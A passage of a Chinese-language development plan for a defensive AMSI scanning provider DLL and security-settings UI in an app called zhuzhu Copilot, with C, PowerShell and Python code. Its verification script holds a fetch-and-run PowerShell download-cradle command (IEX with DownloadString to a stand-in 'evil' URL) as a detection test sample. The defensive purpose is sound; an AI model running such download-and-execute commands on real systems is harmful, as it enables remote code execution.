    ULONG   (STDMETHODCALLTYPE *Release)(void*);
    HRESULT (STDMETHODCALLTYPE *Read)(void*, void*, ULONG, ULONG*);
} StreamVtbl;

/* --- JSON 构造（手工转义，无第三方库） --- */
typedef struct {
    char *data;
    size_t len, cap;
} Buf;

static int buf_reserve(Buf *b, size_t need) {
    if (b->len + need + 1 <= b->cap)
        return 1;
    size_t cap = b->cap ? b->cap * 2 : 256;
    while (cap < b->len + need + 1)
        cap *= 2;
    char *p = (char*)realloc(b->data, cap);
    if (!p)
        return 0;
    b->data = p;
    b->cap = cap;
    return 1;
}

static void buf_put(Buf *b, const char *s, size_t n) {
    if (!buf_reserve(b, n))
        return;
    memcpy(b->data + b->len, s, n);
    b->len += n;
}

static const char kHex[] = "0123456789ABCDEF";

static char *build_content_json(const BYTE *in, ULONG n, int utf16) {
    Buf b = { 0 };
    buf_put(&b, "{\"content\":\"", 12);
    if (utf16) {
        const WCHAR *w = (const WCHAR*)(in + ((n >= 2 && in[0] == 0xFF && in[1] == 0xFE) ? 2 : 0));
        ULONG wlen = (n - ((n >= 2 && in[0] == 0xFF && in[1] == 0xFE) ? 2 : 0)) / 2;
        if (wlen > 0) {
            char *u8 = (char*)malloc((size_t)wlen * 3 + 1);
            if (u8) {
                int len = WideCharToMultiByte(CP_UTF8, 0, w, (int)wlen, u8,
                                              (int)((size_t)wlen * 3), NULL, NULL);
                if (len > 0) {
                    for (int i = 0; i < len; i++) {
                        unsigned char c = (unsigned char)u8[i];
                        switch (c) {
                        case '"':  buf_put(&b, "\\\"", 2); break;
                        case '\\': buf_put(&b, "\\\\", 2); break;
                        case '\n': buf_put(&b, "\\n", 2); break;
                        case '\r': buf_put(&b, "\\r", 2); break;
                        case '\t': buf_put(&b, "\\t", 2); break;
                        default:
                            if (c < 0x20) {
                                char esc[6] = { '\\','u','0','0', kHex[c >> 4], kHex[c & 15] };
                                buf_put(&b, esc, 6);
                            } else if (c >= 0x80) {
                                buf_put(&b, (const char*)&u8[i], 1);
                            } else {
                                buf_put(&b, (const char*)&c, 1);
                            }
                        }
                    }
                }
                free(u8);
            }
        }
    } else {
        for (ULONG i = 0; i < n; i++) {
            unsigned char c = in[i];
            switch (c) {
            case '"':  buf_put(&b, "\\\"", 2); break;
            case '\\': buf_put(&b, "\\\\", 2); break;
            case '\n': buf_put(&b, "\\n", 2); break;
            case '\r': buf_put(&b, "\\r", 2); break;
            case '\t': buf_put(&b, "\\t", 2); break;
            default:
                if (c < 0x20) {
                    char esc[6] = { '\\','u','0','0', kHex[c >> 4], kHex[c & 15] };
                    buf_put(&b, esc, 6);
                } else {
                    buf_put(&b, (const char*)&c, 1);
                }
            }
        }
    }
    buf_put(&b, "\",\"name\":\"amsi\"}", 15);
    if (b.data)
        b.data[b.len] = '\0';
    return b.data;
}

/* --- pipe 投递（DLL 侧 1s 超时，任何失败返回 FALSE=放行） --- */
static BOOL pipe_detect(const char *json) {
    if (!WaitNamedPipeW(kPipeName, PIPE_TIMEOUT_MS))
        return FALSE;
    HANDLE h = CreateFileW(kPipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return FALSE;

    BOOL ok = FALSE;
    char *body = NULL;
    DWORD len = (DWORD)strlen(json);
    OVERLAPPED ov = { 0 }, ov2 = { 0 };
    ov.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    ov2.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    DWORD done = 0;
    if (WriteFile(h, &len, 4, &done, NULL) && done == 4 &&
        WriteFile(h, json, len, &done, NULL) && done == len) {
        DWORD got = 0;
        BOOL pending = !ReadFile(h, &len, 4, &got, &ov) &&
                       GetLastError() == ERROR_IO_PENDING;
        if (pending && WaitForSingleObject(ov.hEvent, PIPE_TIMEOUT_MS) == WAIT_OBJECT_0)
            GetOverlappedResult(h, &ov, &got, FALSE);
        else if (pending)
            CancelIoEx(h, &ov);
        else if (got != 4)
            goto out;
        if (got == 4 && len > 0 && len <= 65536) {
            body = (char*)malloc(len + 1);
            if (body) {
                got = 0;
                BOOL pending2 = !ReadFile(h, body, len, &got, &ov2) &&
                                GetLastError() == ERROR_IO_PENDING;
                if (pending2 && WaitForSingleObject(ov2.hEvent, PIPE_TIMEOUT_MS) == WAIT_OBJECT_0)
                    GetOverlappedResult(h, &ov2, &got, FALSE);
                else if (pending2)
                    CancelIoEx(h, &ov2);
                if (got > 0) {
                    body[got < len ? got : len - 1] = '\0';
                    ok = strstr(body, "\"detected\":true") != NULL;
                }
            }
        }
    }
out:
    CloseHandle(ov.hEvent);
    CloseHandle(ov2.hEvent);
    if (body)
        free(body);
    CloseHandle(h);
    return ok;
}

/* --- IAntimalwareProvider 实现 --- */
static ULONG STDMETHODCALLTYPE Provider_AddRef(void *This) {
    (void)This;
    InterlockedIncrement(&g_com_objects);
    return (ULONG)g_com_objects;
}

static ULONG STDMETHODCALLTYPE Provider_Release(void *This) {
    (void)This;
    LONG n = InterlockedDecrement(&g_com_objects);
    if (n < 0)
        InterlockedExchange(&g_com_objects, 0);
    return (ULONG)(n > 0 ? n : 0);
}

static HRESULT STDMETHODCALLTYPE Provider_QueryInterface(void *This, REFIID riid, void **ppv) {
    (void)This;
    if (!ppv)
        return E_POINTER;
    if (IsEqualIID(riid, &IID_IUnknown) || IsEqualIID(riid, &IID_IAntimalwareProvider)) {
        *ppv = &provider_obj_vtbl_ref;
        return S_OK;
    }
    *ppv = NULL;
    return E_NOINTERFACE;
}

static HRESULT STDMETHODCALLTYPE Provider_Scan(void *This, IStream *stream, AMSI_RESULT *result) {
    (void)This;
    if (!stream || !result)
        return E_POINTER;
    *result = 0; /* AMSI_RESULT_CLEAN */

    StreamVtbl *sv = *(StreamVtbl**)stream;
    if (!sv || !sv->Read)
        return S_OK;

    BYTE *buf = (BYTE*)malloc(MAX_SCAN_BYTES);
    if (!buf)
        return S_OK;
    ULONG total = 0;
    for (;;) {
        ULONG got = 0;
        HRESULT hr = sv->Read(stream, buf + total, MAX_SCAN_BYTES - total, &got);
        if (FAILED(hr) || got == 0)
            break;
        total += got;
        if (total >= MAX_SCAN_BYTES)
            break;
    }
    if (total == 0) {
        free(buf);
        return S_OK;
    }

    int utf16 = 0;
    if (total >= 2 && buf[0] == 0xFF && buf[1] == 0xFE)
        utf16 = 2;                       /* 含 BOM，跳过 2 字节 */
    else if (total >= 2 && buf[1] == 0x00)
        utf16 = 1;

    char *json = build_content_json(buf, total, utf16);
    free(buf);
    if (!json)
        return S_OK;
    BOOL hit = pipe_detect(json);
    free(json);
    if (hit)
        *result = 32768;                 /* AMSI_RESULT_DETECTED */
    return S_OK;
}

static void STDMETHODCALLTYPE Provider_CloseSession(void *This, ULONGLONG session) {
    (void)This;
    (void)session;
}

static void STDMETHODCALLTYPE Provider_DisplayName(void *This, LPWSTR *name) {
    (void)This;
    if (!name)
        return;
    static const WCHAR kName[] = L"zhuzhu Copilot Security Engine";
    *name = (LPWSTR)CoTaskMemAlloc(sizeof(kName));
    if (*name)
        memcpy(*name, kName, sizeof(kName));
}

static ProviderVtbl provider_vtbl = {
    Provider_QueryInterface, Provider_AddRef, Provider_Release,
    Provider_Scan, Provider_CloseSession, Provider_DisplayName
};

/* --- IClassFactory --- */
typedef struct ClassFactory ClassFactory;
typedef struct ClassFactoryVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ClassFactory*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(ClassFactory*);
    ULONG   (STDMETHODCALLTYPE *Release)(ClassFactory*);
    HRESULT (STDMETHODCALLTYPE *CreateInstance)(ClassFactory*, IUnknown*, REFIID, void**);
    HRESULT (STDMETHODCALLTYPE *LockServer)(ClassFactory*, BOOL);
} ClassFactoryVtbl;

struct ClassFactory {
    ClassFactoryVtbl *lpVtbl;
};

static ULONG STDMETHODCALLTYPE CF_AddRef(ClassFactory *This) {
    (void)This;
    InterlockedIncrement(&g_com_objects);
    return (ULONG)g_com_objects;
}

static ULONG STDMETHODCALLTYPE CF_Release(ClassFactory *This) {
    (void)This;
    LONG n = InterlockedDecrement(&g_com_objects);
    if (n < 0)
        InterlockedExchange(&g_com_objects, 0);
    return (ULONG)(n > 0 ? n : 0);
}

static HRESULT STDMETHODCALLTYPE CF_QueryInterface(ClassFactory *This, REFIID riid, void **ppv) {
    (void)This;
    if (!ppv)
        return E_POINTER;
    if (IsEqualIID(riid, &IID_IUnknown) || IsEqualIID(riid, &IID_IClassFactory)) {
        *ppv = This;
        return S_OK;
    }
    *ppv = NULL;
    return E_NOINTERFACE;
}

static HRESULT STDMETHODCALLTYPE CF_CreateInstance(ClassFactory *This, IUnknown *outer,
                                                   REFIID riid, void **ppv) {
    (void)This;
    (void)outer;
    if (!ppv)
        return E_POINTER;
    *ppv = NULL;
    return Provider_QueryInterface(NULL, riid, ppv);
}

static HRESULT STDMETHODCALLTYPE CF_LockServer(ClassFactory *This, BOOL fLock) {
    (void)This;
    if (fLock)
        InterlockedIncrement(&g_locks);
    else
        InterlockedDecrement(&g_locks);
    return S_OK;
}

static ClassFactoryVtbl cf_vtbl = {
    CF_QueryInterface, CF_AddRef, CF_Release, CF_CreateInstance, CF_LockServer
};
static ClassFactory cf_obj = { &cf_vtbl };

/* --- 导出 --- */
typedef HRESULT (WINAPI *DllGetClassObjectFn)(REFCLSID, REFIID, LPVOID*);

HRESULT WINAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID *ppv) {
    if (!ppv)
        return E_POINTER;
    if (!IsEqualCLSID(rclsid, &CLSID_AmsiProvider))
        return CLASS_E_CLASSNOTAVAILABLE;
    return CF_QueryInterface(&cf_obj, riid, ppv);
}

HRESULT WINAPI DllCanUnloadNow(void) {
    return (g_com_objects == 0 && g_locks == 0) ? S_OK : S_FALSE;
}

static LONG reg_set(HKEY root, LPCWSTR sub, LPCWSTR name, LPCWSTR value) {
    HKEY k;
    LONG r = RegCreateKeyExW(root, sub, 0, NULL, 0, KEY_WRITE, NULL, &k, NULL);
    if (r != ERROR_SUCCESS)
        return r;
    r = RegSetValueExW(k, name, 0, REG_SZ, (const BYTE*)value,
                       (DWORD)((wcslen(value) + 1) * sizeof(WCHAR)));
    RegCloseKey(k);
    return r;
}

HRESULT WINAPI DllRegisterServer(void) {
    WCHAR path[PATH_BUF];
    DWORD n = GetModuleFileNameW(NULL, path, PATH_BUF);
    if (n == 0 || n >= PATH_BUF)
        return E_FAIL;
    if (reg_set(HKEY_LOCAL_MACHINE, kRegProviders, L"", path) != ERROR_SUCCESS)
        return E_FAIL;
    if (reg_set(HKEY_LOCAL_MACHINE, kRegClsid, L"",
                L"zhuzhu Copilot AMSI Provider") != ERROR_SUCCESS)
        return E_FAIL;
    if (reg_set(HKEY_LOCAL_MACHINE, kRegInproc, L"", path) != ERROR_SUCCESS)
        return E_FAIL;
    if (reg_set(HKEY_LOCAL_MACHINE, kRegInproc, L"ThreadingModel", L"Both") != ERROR_SUCCESS)
        return E_FAIL;
    return S_OK;
}

HRESULT WINAPI DllUnregisterServer(void) {
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, kRegClsid);
    RegDeleteKeyW(HKEY_LOCAL_MACHINE, kRegProviders);
    return S_OK;
}

BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved) {
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        provider_obj_vtbl_ref.lpVtbl = &provider_vtbl;
        DisableThreadLibraryCalls(inst);
    }
    return TRUE;
}
```

* [ ] **Step 11.2: 导出表与编译脚本**

`build/amsi_provider/amsi_provider.def`：

```
LIBRARY amsi_provider
EXPORTS
    DllGetClassObject
    DllCanUnloadNow
    DllRegisterServer
    DllUnregisterServer
```

`build/amsi_provider/build_amsi.ps1`（UTF-8 BOM 保存，兼容 PowerShell 5.1）：

```powershell
param(
    [string]$Gcc = "",
    [string]$Cl = ""
)
$ErrorActionPreference = "Stop"
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$dll = Join-Path $here "amsi_provider.dll"
$c = Join-Path $here "amsi_provider.c"
$def = Join-Path $here "amsi_provider.def"

if (-not $Gcc) { $Gcc = (Get-Command gcc -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty Source) }
if ($Gcc) {
    Write-Host "使用 gcc: $Gcc"
    & $Gcc -shared -O2 -o $dll $c $def -lole32 -loleaut32
    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
    Write-Host "构建完成: $dll"
    exit 0
}
if (-not $Cl) { $Cl = (Get-Command cl -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty Source) }
if ($Cl) {
    Write-Host "使用 cl: $Cl"
    Push-Location $here
    try {
        & $Cl /nologo /LD /O2 $c ole32.lib oleaut32.lib /Fe:amsi_provider.dll /link /DEF:amsi_provider.def
        if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
    } finally { Pop-Location }
    Write-Host "构建完成: $dll"
    exit 0
}
Write-Error "未找到 C 编译器（gcc 或 cl）。请安装 MinGW-w64 或 Visual Studio C++ 工具链后重试。"
exit 2
```

* [ ] **Step 11.3: 写端到端验证脚本（先失败）**

```python
# scripts/_verify_amsi_dll.py —— AMSI 端到端：编译→注册→PowerShell 触发→判定→反注册
import base64, ctypes, os, subprocess, sys, time
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src"))

FAILS = []
SKIPS = []
def check(name, cond, detail=""):
    print(("PASS " if cond else "FAIL ") + name + ((" :: " + detail) if detail else ""))
    if not cond:
        FAILS.append(name)
def skip(name, why):
    print("SKIP " + name + " :: " + why)
    SKIPS.append(name)

from zhuzhu_Copilot.core.security_engine.engine import SecurityEngine
from zhuzhu_Copilot.core.security_engine.amsi_bridge import AmsiBridge, is_registered
from zhuzhu_Copilot.utils.helpers import is_admin

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DLL = os.path.join(ROOT, "build", "amsi_provider", "amsi_provider.dll")

if not os.path.isfile(DLL):
    r = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                        "-File", os.path.join(ROOT, "build", "amsi_provider", "build_amsi.ps1")],
                       capture_output=True, text=True)
    print(r.stdout[-400:])
    if r.returncode != 0:
        skip("AMSI DLL 编译", f"无编译器或编译失败: {r.stderr[-200:]}")
        print("TOTAL", len(FAILS), "FAILURES,", len(SKIPS), "SKIPS")
        sys.exit(1 if FAILS else 0)
check("AMSI DLL 存在", os.path.isfile(DLL))

if not is_admin():
    skip("AMSI 端到端", "需要管理员权限（注册 HKLM AMSI Providers）")
    print("TOTAL", len(FAILS), "FAILURES,", len(SKIPS), "SKIPS")
    sys.exit(1 if FAILS else 0)

eng = SecurityEngine()
bridge = AmsiBridge(eng)
eng.start()
bridge.start()
try:
    # 1) 注册 Provider（ctypes 直接调用 DllRegisterServer，真实 API）
    try:
        ctypes.WinDLL(DLL).DllRegisterServer()
    except Exception as e:
        subprocess.run(["regsvr32", "/s", DLL], check=False)
    check("AMSI Provider 已注册", is_registered())

    # 2) 良性脚本 → 引擎收到内容（真实 AMSI 扫描链路）
    benign = base64.b64encode("Write-Output amsi_probe_ok".encode("utf-16-le")).decode()
    subprocess.run(["powershell", "-NoProfile", "-EncodedCommand", benign],
                   capture_output=True, timeout=90)
    deadline = time.time() + 15
    while time.time() < deadline and bridge.scanned < 1:
        time.sleep(0.5)
    check("AMSI 脚本内容到达引擎", bridge.scanned >= 1, f"scanned={bridge.scanned}")

    # 3) 恶意脚本 → 实际执行触发 AMSI → 引擎判定 detected（AMSI 拦截依据）
    evil = base64.b64encode(
        "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/evil')".encode("utf-16-le")).decode()
    subprocess.run(["powershell", "-NoProfile", "-EncodedCommand", evil],
                   capture_output=True, timeout=90)
    deadline2 = time.time() + 15
    while time.time() < deadline2 and bridge.detected < 1:
        time.sleep(0.5)
    check("AMSI 恶意样本检出", bridge.detected >= 1, f"detected={bridge.detected}")
finally:
    eng.stop()
    bridge.stop()

# 4) 反注册
try:
    ctypes.WinDLL(DLL).DllUnregisterServer()
except Exception:
    pass
check("AMSI Provider 已反注册", not is_registered())

print("TOTAL", len(FAILS), "FAILURES,", len(SKIPS), "SKIPS")
sys.exit(1 if FAILS else 0)
```

* [ ] **Step 11.4: 运行验证 → 修复 → 复验**

Run: `python scripts/_verify_amsi_dll.py`
Expected: 全部 PASS（管理员终端运行；非管理员仅验证编译并 SKIP 端到端）
调试要点：若 scanned==0，检查注册表 Provider 路径是否为该 DLL 全路径、系统新 PowerShell 进程是否加载（注册后新进程才生效，本脚本每次新 spawn 均满足）。若 PowerShell 阻止执行被安全中心拦截属预期（本 Provider 判定即达到目的）。

* [ ] **Step 11.5: 提交**

```powershell
git add build/amsi_provider/ scripts/_verify_amsi_dll.py ; git commit -m "feat(security): 原生AMSI Provider DLL（C源码+编译+端到端验证）"
```

***

### Task 12: UI 集成（防护设置对话框 + 监控线程接入）

**Files:**

* Create: `src/zhuzhu_Copilot/ui/security_settings_dialog.py`

* Create: `scripts/_verify_security_settings.py`

* Modify: `src/zhuzhu_Copilot/ui/main_window.py`（imports、SecurityMonitorWorker、row3 按钮、\_on\_security\_result）

* [ ] **Step 12.1: 写验证脚本（先失败）**

```python
# scripts/_verify_security_settings.py
import json, os, sys
os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src"))

FAILS = []
def check(name, cond, detail=""):
    print(("PASS " if cond else "FAIL ") + name + ((" :: " + detail) if detail else ""))
    if not cond:
        FAILS.append(name)

from PyQt6.QtWidgets import QApplication
from PyQt6.QtCore import QSettings
from zhuzhu_Copilot.core.security_engine.engine import SecurityEngine
from zhuzhu_Copilot.ui.security_settings_dialog import SecuritySettingsDialog, _load_list

app = QApplication.instance() or QApplication([])
eng = SecurityEngine()
dlg = SecuritySettingsDialog(lambda: eng)
check("受保护目录默认加载", dlg.prot_list.count() >= 1, str(dlg.prot_list.count()))
check("处置级别默认分级", dlg.level_combo.currentData() == "graded", str(dlg.level_combo.currentData()))
check("LLM开关默认关闭", dlg.llm_check.isChecked() is False)
check("AMSI按钮存在", dlg.btn_amsi_reg.text() and dlg.btn_amsi_unreg.text())
# 添加临时目录 → 保存 → 校验持久化与引擎同步
import tempfile
t1 = tempfile.mkdtemp(prefix="prot_")
dlg.prot_list.addItem(t1)
i = dlg.level_combo.findData("auto")
dlg.level_combo.setCurrentIndex(i)
dlg.llm_check.setChecked(True)
dlg._save()
s = QSettings("zhuzhu Copilot", "zhuzhu Copilot")
saved = _load_list("security_protected_dirs", [])
check("目录持久化", t1 in saved, str(saved))
check("处置级别持久化", s.value("security_action_level") == "auto")
check("LLM开关持久化", s.value("security_llm_on", False, type=bool) is True)
check("引擎处置级别同步", eng._action_level == "auto")
# 规则重载即时生效
n = eng.rules.reload()
dlg._refresh_rules_label()
check("规则重载后标签更新", str(n) in dlg.rules_label.text(), dlg.rules_label.text())
# 清理测试残留
removed = [x for x in saved if x == t1]
s.setValue("security_protected_dirs", json.dumps([x for x in saved if x != t1]))
s.setValue("security_action_level", "graded")
s.setValue("security_llm_on", False)
import shutil
shutil.rmtree(t1, ignore_errors=True)
check("清理残留", True)
eng.stop()

print("TOTAL", len(FAILS), "FAILURES")
sys.exit(1 if FAILS else 0)
```

* [ ] **Step 12.2: 运行验证（预期失败）**

Run: `python scripts/_verify_security_settings.py`
Expected: FAIL `ModuleNotFoundError`

* [ ] **Step 12.3: 实现设置对话框**

`src/zhuzhu_Copilot/ui/security_settings_dialog.py`：

```python
"""安全防护设置对话框：受保护目录/信任目录/处置级别/LLM 分析/AMSI Provider/规则库"""
import json
import os
import sys
from pathlib import Path

from PyQt6.QtCore import QSettings
from PyQt6.QtWidgets import (QCheckBox, QComboBox, QDialog, QFileDialog, QHBoxLayout,
                             QLabel, QListWidget, QMessageBox, QPushButton, QVBoxLayout)

from zhuzhu_Copilot.core.security_engine import amsi_bridge
from zhuzhu_Copilot.core.security_engine.ransomware_shield import default_protected_dirs
from zhuzhu_Copilot.utils.helpers import is_admin

SETTINGS_KEY_DIRS = "security_protected_dirs"
SETTINGS_KEY_TRUST = "security_trusted_dirs"
SETTINGS_KEY_LEVEL = "security_action_level"
SETTINGS_KEY_LLM = "security_llm_on"


def _load_list(key: str, default: list) -> list:
    try:
        v = QSettings("zhuzhu Copilot", "zhuzhu Copilot").value(key)
        if isinstance(v, str) and v:
            return json.loads(v)
        if isinstance(v, list):
            return v
    except ValueError:
        pass
    return default


def amsi_dll_path() -> str:
    if getattr(sys, "frozen", False):
        return os.path.join(getattr(sys, "_MEIPASS", "."), "assets", "amsi_provider.dll")
    return str(Path(__file__).resolve().parents[3] / "build" / "amsi_provider" / "amsi_provider.dll")


class SecuritySettingsDialog(QDialog):
    """安全防护参数（保存到 QSettings 并即时同步到防护引擎）"""

    def __init__(self, engine_provider, parent=None):
        super().__init__(parent)
        self.setWindowTitle("安全防护设置")
        self.setMinimumWidth(540)
        self._engine_provider = engine_provider
        self._settings = QSettings("zhuzhu Copilot", "zhuzhu Copilot")
        lay = QVBoxLayout(self)
        lay.setSpacing(10)

        # 受保护目录
        lay.addWidget(QLabel("受保护目录（勒索防护实时监控）"))
        self.prot_list = QListWidget()
        self.prot_list.addItems(_load_list(SETTINGS_KEY_DIRS, default_protected_dirs()))
        lay.addWidget(self.prot_list)
        prot_btns = QHBoxLayout()
        add_btn = QPushButton("添加目录")
        add_btn.clicked.connect(self._add_prot)
        del_btn = QPushButton("移除选中")
        del_btn.clicked.connect(
            lambda: self.prot_list.takeItem(self.prot_list.currentRow())
            if self.prot_list.currentRow() >= 0 else None)
        prot_btns.addWidget(add_btn)
        prot_btns.addWidget(del_btn)
        prot_btns.addStretch(1)
        lay.addLayout(prot_btns)

        # 信任目录
        lay.addWidget(QLabel("信任目录（监控白名单）"))
        self.trust_list = QListWidget()
        self.trust_list.addItems(_load_list(SETTINGS_KEY_TRUST, []))
        lay.addWidget(self.trust_list)

        # 处置级别
        level_row = QHBoxLayout()
        level_row.addWidget(QLabel("处置级别"))
        self.level_combo = QComboBox()
        self.level_combo.addItem("分级（高置信度自动处置）", "graded")
        self.level_combo.addItem("全部自动处置", "auto")
        self.level_combo.addItem("全部人工确认", "ask")
        cur = str(self._settings.value(SETTINGS_KEY_LEVEL, "graded") or "graded") or "graded"
        self.level_combo.setCurrentIndex(max(0, self.level_combo.findData(cur)))
        level_row.addWidget(self.level_combo, 1)
        lay.addLayout(level_row)

        # LLM 深度分析
        self.llm_check = QCheckBox("启用 LLM 深度分析（低置信度样本二次判定，使用已配置服务商模型）")
        self.llm_check.setChecked(self._settings.value(SETTINGS_KEY_LLM, False, type=bool))
        lay.addWidget(self.llm_check)

        # AMSI Provider
        amsi_row = QHBoxLayout()
        amsi_row.addWidget(QLabel("AMSI 脚本防护 Provider（Windows 系统级）"))
        self.amsi_label = QLabel(
            "已注册" if amsi_bridge.is_registered() else "未注册")
        amsi_row.addWidget(self.amsi_label)
        self.btn_amsi_reg = QPushButton("注册")
        self.btn_amsi_reg.clicked.connect(self._amsi_register)
        self.btn_amsi_unreg = QPushButton("反注册")
        self.btn_amsi_unreg.clicked.connect(self._amsi_unregister)
        amsi_row.addWidget(self.btn_amsi_reg)
        amsi_row.addWidget(self.btn_amsi_unreg)
        lay.addLayout(amsi_row)

        # 规则库
        rules_row = QHBoxLayout()
        self.rules_label = QLabel("")
        self._refresh_rules_label()
        rules_row.addWidget(self.rules_label, 1)
        reload_btn = QPushButton("重载规则库")
        reload_btn.clicked.connect(lambda: self._refresh_rules_label(reload=True))
        rules_row.addWidget(reload_btn)
        lay.addLayout(rules_row)

        # 保存/取消
        btns = QHBoxLayout()
        btns.addStretch(1)
        save_btn = QPushButton("保存")
        save_btn.clicked.connect(self._save)
        cancel_btn = QPushButton("取消")
        cancel_btn.clicked.connect(self.reject)
        btns.addWidget(save_btn)
        btns.addWidget(cancel_btn)
        lay.addLayout(btns)

    def _add_prot(self):
        d = QFileDialog.getExistingDirectory(self, "选择受保护目录")
        if d:
            self.prot_list.addItem(d)

    def _amsi_register(self):
        if not is_admin():
            QMessageBox.warning(self, "权限不足", "AMSI Provider 注册需要管理员权限。")
            return
        dll = amsi_dll_path()
        if not os.path.isfile(dll):
            QMessageBox.warning(self, "未找到组件", f"AMSI Provider DLL 不存在:\n{dll}")
            return
        self.amsi_label.setText("已注册" if amsi_bridge.register_provider(dll) else "注册失败")

    def _amsi_unregister(self):
        if not is_admin():
            QMessageBox.warning(self, "权限不足", "AMSI Provider 反注册需要管理员权限。")
            return
        self.amsi_label.setText(
            "未注册" if amsi_bridge.unregister_provider() else "反注册失败")

    def _refresh_rules_label(self, reload: bool = False):
        eng = self._engine_provider()
        if eng:
            if reload:
                eng.rules.reload()
            path = str(eng.rules.rules_path or "")
            self.rules_label.setText(f"规则库：{len(eng.rules._rules)} 条 · {path}")
        else:
            self.rules_label.setText("规则库：防护未开启")

    def _save(self):
        self._settings.setValue(SETTINGS_KEY_DIRS, json.dumps(
            [self.prot_list.item(i).text() for i in range(self.prot_list.count())]))
        self._settings.setValue(SETTINGS_KEY_TRUST, json.dumps(
            [self.trust_list.item(i).text() for i in range(self.trust_list.count())]))
        level = str(self.level_combo.currentData() or "graded")
        self._settings.setValue(SETTINGS_KEY_LEVEL, level)
        self._settings.setValue(SETTINGS_KEY_LLM, self.llm_check.isChecked())
        eng = self._engine_provider()
        if eng:
            eng.set_action_level(level)
            eng.set_llm_cfg(_llm_cfg() if self.llm_check.isChecked() else {})
        self.accept()


def _llm_cfg() -> dict:
    try:
        from zhuzhu_Copilot.core.agent_llm import load_model_config
        cfg = load_model_config() or {}
        return {"enabled": True, "base_url": cfg.get("base_url") or "",
                "api_key": cfg.get("api_key") or "", "model": cfg.get("model") or "",
                "timeout_s": 15.0}
    except Exception:
        return {}
```

* [ ] **Step 12.4: 修改 main\_window\.py**

三处精确修改：

1. 文件头部 imports（在 `from zhuzhu_Copilot.core.security import SecurityScanner, quarantine_dir` 之后追加）：

```python
from zhuzhu_Copilot.core.security_engine.engine import SecurityEngine
from zhuzhu_Copilot.core.security_engine.ransomware_shield import RansomwareShield, default_protected_dirs
from zhuzhu_Copilot.core.security_engine.startup_guard import StartupGuard
from zhuzhu_Copilot.core.security_engine.command_intel import CommandIntel
from zhuzhu_Copilot.core.security_engine.amsi_bridge import AmsiBridge
from zhuzhu_Copilot.ui.security_settings_dialog import SecuritySettingsDialog, _load_list
```

1. `SecurityMonitorWorker.__init__`（在 `self.guard = ExecutionGuard()` 之后追加）与 `run`（嵌套 try/finally）与 `stop`：

```python
        # ---- 端点防护引擎（子项目A）：统一事件流监测器 ----
        self.engine = SecurityEngine()
        self.engine.set_notify(self._engine_event)
        s = QSettings("zhuzhu Copilot", "zhuzhu Copilot")
        self.engine.set_action_level(str(s.value("security_action_level", "graded")) or "graded")
        if s.value("security_llm_on", False, type=bool):
            self.engine.set_llm_cfg(_llm_cfg_from_settings())
        dirs = _load_list("security_protected_dirs", default_protected_dirs())
        self.engine.add_monitor(StartupGuard(self.engine))
        self.engine.add_monitor(RansomwareShield(self.engine, dirs=dirs))
        self.engine.add_monitor(CommandIntel(self.engine))
        self.engine.add_monitor(AmsiBridge(self.engine))
```

`SecurityMonitorWorker.run` 整体替换为（启动/停止引擎，包裹现有巡检循环）：

```python
    def run(self):
        tick = 0
        self.guard.start()  # 记录基线：防护开启前已运行的进程视为可信
        self.engine.start()
        self.engine.start_monitors()
        try:
            while True:
                tick += 1
                try:
                    summary = self.scanner.sweep(
                        include_network=(tick % 5 == 0),  # 每 ~50 秒检查网络
                    )
                    attacks = self.defender.check()
                    if attacks["arp_spoof"] or (attacks["flood"] and attacks["flood"]["detected"]):
                        summary["attacks"] = attacks
                    exec_res = self.guard.check()
                    if exec_res["blocked"] or exec_res["warned"]:
                        summary["exec_guard"] = exec_res
                    if summary["killed"] or summary["removed"] or summary["failed"] \
                            or summary["network"] or summary.get("attacks") \
                            or summary.get("exec_guard"):
                        self.result.emit(summary)
                except Exception:
                    logger.exception("安全监控异常")
                if self._stop.wait(10):
                    break
        finally:
            self.engine.stop()

    def _engine_event(self, payload: dict):
        self.result.emit({"engine": payload})
```

模块级新增（文件底部或类外均可）：

```python
def _llm_cfg_from_settings() -> dict:
    try:
        from zhuzhu_Copilot.core.agent_llm import load_model_config
        cfg = load_model_config() or {}
        return {"enabled": True, "base_url": cfg.get("base_url") or "",
                "api_key": cfg.get("api_key") or "", "model": cfg.get("model") or "",
                "timeout_s": 15.0}
    except Exception:
        return {}
```

1. row3 加「防护设置」按钮（替换现有 row3 段，约 main\_window\.py:819-825）：

```python
        self.security_btn = _icon_button("开启静默防护", _ICON_SHIELD, height=40)
        self.security_btn.clicked.connect(self._toggle_security)
        self.sec_settings_btn = _icon_button("防护设置", _ICON_SHIELD, kind="ghost", height=40)
        self.sec_settings_btn.clicked.connect(self._open_security_settings)
        row3 = QHBoxLayout()
        row3.setSpacing(10)
        row3.addWidget(self.memory_btn, 1)
        row3.addWidget(self.security_btn, 1)
        row3.addWidget(self.sec_settings_btn, 1)
        layout.addLayout(row3)
```

新增方法（在 `_toggle_security` 附近）：

```python
    def _open_security_settings(self):
        dlg = SecuritySettingsDialog(
            lambda: self.security_worker.engine if self.security_worker else None, self)
        dlg.exec()
```

1. `_on_security_result`：在 `exec_res` 分支之后、`if not lines:` 之前插入：

```python
        eng = summary.get("engine") or {}
        ev = eng.get("event") or {}
        if ev:
            act = eng.get("action") or "notify"
